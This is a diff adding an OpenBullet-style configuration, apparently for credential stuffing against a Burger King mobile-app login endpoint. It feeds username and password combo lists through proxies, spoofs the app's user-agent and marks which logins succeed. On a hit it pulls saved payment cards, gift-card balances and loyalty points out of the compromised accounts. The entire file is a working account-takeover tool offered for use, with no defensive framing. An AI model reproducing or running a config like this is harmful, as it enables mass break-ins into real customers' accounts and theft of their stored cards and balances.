@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "BK",
+  "SuggestedBots": 50,
+  "LastModified": "2018-09-02T23:51:26.6044735+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://bkm-native-prod.tillster.com/mobile-aggregation-service/rest/account/login" AutoRedirect=TRUE 
+  CONTENT "{\"password\": \"<PASS>\",\"username\": \"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "tenant: bk-us-native" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "errorCode" 
+  KEYCHAIN Success OR 
+    KEY "ticket" 
+#PARSE_LOYALTY_POINTS PARSE "<SOURCE>" JSON "loyaltyPoints" Recursive=FALSE -> VAR "LOYALTY POINTS" "" "" 
+#PARSE_SAVED_CARDS PARSE "<SOURCE>" JSON "savedCards" Recursive=FALSE -> VAR "SAVED CARDS" "" "" 
+#PARSE_GC_BALANCE_LIST PARSE "<SOURCE>" JSON "giftCardDetailedBalanceList" Recursive=FALSE -> VAR "GC BALANCE LIST" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "savedCards\":[]" 
+    KEY "giftCardDetailedBalanceList\":[]" 
+    KEY "loyaltyPoints\":0" 
